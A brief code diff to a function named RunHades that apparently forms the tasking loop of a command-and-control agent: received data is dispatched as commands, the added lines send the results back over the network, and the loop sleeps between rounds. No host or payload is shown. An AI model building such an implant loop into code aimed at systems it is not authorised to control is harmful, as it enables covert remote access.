@@ -4,7 +4,6 @@
 
 
 BOOL RunHades() {
-
 	hades = AllocMemory<Hades>(sizeof(Hades));
 	
 
@@ -24,7 +23,11 @@ BOOL RunHades() {
 		}
 		DEBUG_LOG("Capacity = %d\nFinal Size = %d\n", capacity, finalSize);
 
-		if(finalSize > 0) { g_Commander->Dispatch(buf, finalSize, g_ByteMgr->OutData); }
+		if(finalSize > 0) { 
+			g_Commander->Dispatch(buf, finalSize, g_ByteMgr->OutData); 
+			g_Network->SendOutput(g_ByteMgr->OutData, g_ByteMgr->WriteIndex);
+			DEBUG_LOG("Write Index: %u\n", g_ByteMgr->WriteIndex);
+		}
 		
 
 		Sleep(3000);
